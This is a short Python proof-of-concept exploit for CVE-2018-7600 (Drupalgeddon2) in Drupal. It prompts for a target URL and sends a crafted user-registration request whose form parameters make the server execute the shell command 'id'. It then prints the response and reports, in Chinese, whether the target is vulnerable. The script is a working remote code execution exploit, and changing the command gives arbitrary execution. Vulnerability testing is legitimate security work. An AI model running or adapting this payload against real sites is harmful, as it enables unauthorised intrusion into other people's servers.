#!/usr/bin/env python3
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by Sule01u, Echo, ka1ser, J1eula,Abyssa13r')
print ('# https://github.com/moorh/UnknownSec/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

def check_drupal_cve(target_url):
    try:
        verify_ssl = True

        url = f"{target_url}user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': 'id'

        }

        with requests.Session() as session:
            res = session.post(url, data=payload, verify=verify_ssl)

            print("\n返回包内容：")
            print(res.text)

            if res.status_code == 200 and "uid=" in res.text and "gid=" in res.text:
                print(f"\n{target_url} 存在CVE-2018-7600漏洞")
            else:
                print(f"\n{target_url} 不存在CVE-2018-7600漏洞")

    except requests.exceptions.RequestException as e:
        print(f"\n请求出错：{e}")


if __name__ == "__main__":
    target_url = input('请输入目标URL：')
    check_drupal_cve(target_url)
